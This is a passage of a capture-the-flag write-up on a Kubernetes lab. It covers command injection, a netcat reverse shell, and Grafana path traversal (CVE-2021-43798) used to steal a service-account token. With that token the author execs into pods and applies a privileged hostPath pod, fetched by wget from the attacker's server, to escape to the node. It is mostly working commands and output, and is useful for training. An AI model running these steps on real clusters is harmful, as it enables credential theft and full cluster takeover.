+SF:b\x202022\x2016:38:06\x20GMT\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection
+SF::\x20close\r\n\r\nMethod\x20Not\x20Allowed&#34;)%r(RTSPRequest,BC,&#34;HTTP/1\.
+SF:1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Feb\x202
+SF:022\x2016:38:07\x20GMT\r\nContent-Type:\x20text/plain;\x20charset=utf-8
+SF:\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection:\x20c
+SF:lose\r\n\r\nMethod\x20Not\x20Allowed&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Now there is some obvious command injection</p>
+<p>The flag is in an environment variable so we check those!</p>
+<p>there is a command for that</p>
+<pre tabindex="0"><code>ping: usage error: Destination address required
+KUBERNETES_SERVICE_PORT_HTTPS=443
+GRAFANA_SERVICE_HOST=10.108.133.228
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=syringe-79b66d66d7-7mxhd
+SYRINGE_PORT=tcp://10.99.16.179:3000
+GRAFANA_PORT=tcp://10.108.133.228:3000
+SYRINGE_SERVICE_HOST=10.99.16.179
+SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
+GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
+PWD=/home/challenge
+SYRINGE_PORT_3000_TCP_PROTO=tcp
+HOME=/home/challenge
+KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
+GOLANG_VERSION=1.15.7
+FLAG=flag{flag_for_warming_up_real_quick}
+SHLVL=1
+SYRINGE_PORT_3000_TCP_PORT=3000
+GRAFANA_PORT_3000_TCP_PORT=3000
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
+GRAFANA_SERVICE_PORT=3000
+SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
+SYRINGE_SERVICE_PORT=3000
+KUBERNETES_SERVICE_HOST=10.96.0.1
+KUBERNETES_PORT=tcp://10.96.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+GRAFANA_PORT_3000_TCP_PROTO=tcp
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
+_=/usr/bin/env
+</code></pre><p>Get acess (Reverse shell much)</p>
+<p>Get to the the <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux">kubectl</a> in /tmp</p>
+<pre tabindex="0"><code>└──╼ $nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 53060
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+challenge@syringe-79b66d66d7-7mxhd:~$ cd /tmp
+cd /tmp
+challenge@syringe-79b66d66d7-7mxhd:/tmp$ ls
+ls
+kubectl
+challenge@syringe-79b66d66d7-7mxhd:/tmp$
+</code></pre><p>Now try interracting (just follow up) and get Secrets</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secrets
+./kubectl get secrets
+NAME                    TYPE                                  DATA   AGE
+default-token-8bksk     kubernetes.io/service-account-token   3      52d
+developer-token-74lck   kubernetes.io/service-account-token   3      52d
+secretflag              Opaque                                1      52d
+syringe-token-g85mg     kubernetes.io/service-account-token   3      52d
+
+challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get secret secretflag -o &#39;json&#39;
+&lt;xhd:/tmp$ ./kubectl get secret secretflag -o &#39;json&#39;
+{
+    &#34;apiVersion&#34;: &#34;v1&#34;,
+    &#34;data&#34;: {
+        &#34;flag&#34;: &#34;ZmxhZ3tzZWNyZXRmbGFnX2Zvcl9rdWJlcnVzZXJzfQ==&#34;
+    },
+    &#34;kind&#34;: &#34;Secret&#34;,
+    &#34;metadata&#34;: {
+        &#34;annotations&#34;: {
+            &#34;kubectl.kubernetes.io/last-applied-configuration&#34;: &#34;{\&#34;apiVersion\&#34;:\&#34;v1\&#34;,\&#34;data\&#34;:{\&#34;flag\&#34;:\&#34;ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\&#34;},\&#34;kind\&#34;:\&#34;Secret\&#34;,\&#34;metadata\&#34;:{\&#34;annotations\&#34;:{},\&#34;name\&#34;:\&#34;secretflag\&#34;,\&#34;namespace\&#34;:\&#34;default\&#34;},\&#34;type\&#34;:\&#34;Opaque\&#34;}\n&#34;
+        },
+        &#34;creationTimestamp&#34;: &#34;2022-01-06T23:41:19Z&#34;,
+        &#34;name&#34;: &#34;secretflag&#34;,
+        &#34;namespace&#34;: &#34;default&#34;,
+        &#34;resourceVersion&#34;: &#34;562&#34;,
+        &#34;uid&#34;: &#34;6384b135-4628-4693-b269-4e50bfffdf21&#34;
+    },
+    &#34;type&#34;: &#34;Opaque&#34;
+}
+</code></pre><p>Flag is in obvious base64 encoding (duh)</p>
+<p>Now we try to get in with Grafana!</p>
+<p>use <code>curl</code> in the shell as grafana is only available locally (port forward would feel like overkill)</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl http://grafana:3000
+curl http://grafana:3000
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    29  100    29    0     0   9666      0 --:--:-- --:--:-- --:--:--  9666
+&lt;a href=&#34;/login&#34;&gt;Found&lt;/a&gt;.
+</code></pre><pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl http://10.108.133.228:3000/login/
+&lt;-7mxhd:/tmp$ curl http://10.108.133.228:3000/login/
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+...
+
+[REDACTED = REMOVED THE MAD LONG OUTPUT LMAO]
+
+1637855786,&#34;commit&#34;:&#34;8d74cc357&#34;,&#34;edition&#34;:&#34;Enterprise&#34;,&#34;env&#34;:&#34;production&#34;,&#34;hasUpdate&#34;:false,&#34;hideVersion&#34;:false,&#34;isEnterprise&#34;:false,&#34;latestVersion&#34;:&#34;&#34;,&#34;version&#34;:&#34;8.3.0-beta2&#34;},&#34;caching&#34;:
+
+...
+</code></pre><p>Now you got your <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43798">CVE</a> exploit it!</p>
+<p><a href="https://j0vsec.com/post/cve-2021-43798/">This guy</a> explains it!</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ curl --path-as-is http://grafana:3000/public/plugins/alertlist/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+&lt;/var/run/secrets/kubernetes.io/serviceaccount/token
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1022  100  1022    0     0   199k      0 --:--:-- --:--:-- --:--:--  199k
+eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+</code></pre><p>that is a long JWT token (you should put it in a file&hellip;I won&rsquo;t but you should)</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl auth can-i --list --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+&lt;bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+*.*                                             []                                    []               [*]
+                                                [*]                                   []               [*]
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+
+...
+</code></pre><p>I directly go to the shell part&hellip;I can&rsquo;t keep pasting this long token</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+&lt;bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+NAME                       READY   STATUS    RESTARTS       AGE
+grafana-57454c95cb-v4nrk   1/1     Running   10 (28d ago)   52d
+syringe-79b66d66d7-7mxhd   1/1     Running   1 (28d ago)    28d
+</code></pre><p>Do what you could not now</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get services --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+&lt;bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+NAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)          AGE
+grafana      NodePort    10.108.133.228   &lt;none&gt;        3000:30411/TCP   52d
+kubernetes   ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP          52d
+syringe      NodePort    10.99.16.179     &lt;none&gt;        3000:30000/TCP   52d
+
+challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get serviceaccount --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+&lt;bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+NAME        SECRETS   AGE
+default     1         52d
+developer   1         52d
+syringe     1         52d
+</code></pre><p>Now for the shell</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
+&lt;-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+id
+uid=472(grafana) gid=0(root) groups=0(root)
+</code></pre><p>That will do!</p>
+<pre tabindex="0"><code>env
+KUBERNETES_SERVICE_PORT_HTTPS=443
+GRAFANA_SERVICE_HOST=10.108.133.228
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=grafana-57454c95cb-v4nrk
+SYRINGE_PORT=tcp://10.99.16.179:3000
+GRAFANA_PORT=tcp://10.108.133.228:3000
+SYRINGE_SERVICE_HOST=10.99.16.179
+SYRINGE_PORT_3000_TCP=tcp://10.99.16.179:3000
+GRAFANA_PORT_3000_TCP=tcp://10.108.133.228:3000
+PWD=/tmp
+GF_PATHS_HOME=/usr/share/grafana
+SYRINGE_PORT_3000_TCP_PROTO=tcp
+HOME=/home/grafana
+KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
+FLAG=flag{288232b2f03b1ec422c5dae50f14061f}
+SHLVL=1
+SYRINGE_PORT_3000_TCP_PORT=3000
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GRAFANA_PORT_3000_TCP_PORT=3000
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
+GRAFANA_SERVICE_PORT=3000
+SYRINGE_PORT_3000_TCP_ADDR=10.99.16.179
+SYRINGE_SERVICE_PORT=3000
+GF_PATHS_DATA=/var/lib/grafana
+KUBERNETES_SERVICE_HOST=10.96.0.1
+KUBERNETES_PORT=tcp://10.96.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+GF_PATHS_LOGS=/var/log/grafana
+GRAFANA_PORT_3000_TCP_PROTO=tcp
+PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GRAFANA_PORT_3000_TCP_ADDR=10.108.133.228
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+_=/usr/bin/env
+OLDPWD=/usr/share/grafana
+</code></pre><p>Now Escape to the node (sounds cool)</p>
+<p>We gotta make our own pod. <a href="">kubernetes themselves</a> tell you how</p>
+<p>So you need a <code>.yml</code> file like this</p>
+<pre tabindex="0"><code>apiVersion: v1
+kind: Pod
+metadata:
+    name: everything-allowed-pod
+    labels:
+        app: pentest
+spec:
+    hostNetwork: true
+    hostPID: true
+    hostIPC: true
+    containers:
+     - name: everything-allowed-pod
+       image: ubuntu
+       imagePullPolicy: IfNotPresent
+       securityContext:
+        privileged: true
+       volumeMounts:
+        - mountPath: /host
+          name: noderoot
+       command: [ &#34;/bin/sh&#34;, &#34;-c&#34;, &#34;--&#34; ]
+       args: [ &#34;while true; do sleep 30; done;&#34; ]
+    #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+    volumes:
+     - name: noderoot
+       hostPath:
+        path: / 
+</code></pre><p>Make sure your file is well-formatted! I usually use a validator like <a href="https://jsonformatter.org/yaml-formatter">this one</a></p>
+<p>You can put all this in a &lsquo;privesc.yml&rsquo; file (or anything) and upload it with a python server + wget</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ wget http://10.8.226.203:8000/privesc.yml
+&lt;xhd:/tmp$ wget http://10.8.226.203:8000/privesc.yml
+--2022-02-28 19:30:12--  http://10.8.226.203:8000/privesc.yml
+Connecting to 10.8.226.203:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 556 [application/octet-stream]
+Saving to: &#39;privesc.yml&#39;
+
+     0K                                                       100%  115K=0.005s
+
+2022-02-28 19:30:12 (115 KB/s) - &#39;privesc.yml&#39; saved [556/556]
+
+challenge@syringe-79b66d66d7-7mxhd:/tmp$ ls
+ls
+kubectl
+privesc.yml
+</code></pre><p>Now make the pod</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl apply -f privesc.yml --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+&lt;bPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
+pod/everything-allowed-pod created
+</code></pre><p>Check it&rsquo;s presence</p>
+<pre tabindex="0"><code>challenge@syringe-79b66d66d7-7mxhd:/tmp$ ./kubectl get pods --token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc3NjA3OTAzLCJpYXQiOjE2NDYwNzE5MDMsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItdjRucmsiLCJ1aWQiOiJmMmJkMTczZS1iNjU3LTQyNTMtYTM2NC1lNzA5ZDczMWZhMTIifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6IjE5NjdmYzMwLTQxYjktNDJjZC1hZGI3LWZhYjZkYWUxNDhmNiJ9LCJ3YXJuYWZ0ZXIiOjE2NDYwNzU1MTB9LCJuYmYiOjE2NDYwNzE5MDMsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.nddXlHiH68jofQOhTnj_uZDs5RRdeDAhfuMcz5eNwS_W-Xz0UZ9ayml5jq3CIqW7Mlja6PnyVn_wQ1ls4ovIBjDXx_P5oVrGydxqXTjiCT2VpH6EIDMBFTawGguQb4NPsdYOuzlEBOfzat_C5EoSNzvVu3_U3n4HYweZtJ87ErlNKRiuRGI16umI3yR2YRD7gdxV1OwNVG7BcQ6sb6Bh0hJKdpGRBFMH6uYp0Nmr8v7jCY5XATw_P0i9381sERMwyHlrpfuymXl9sxQW53b1OcjyKE6ywvy-hjkbPI2difM8Xqbs-cdhpzPMr3SmBNqf8KyQWNWTGuf5O3-pB8M3Rw
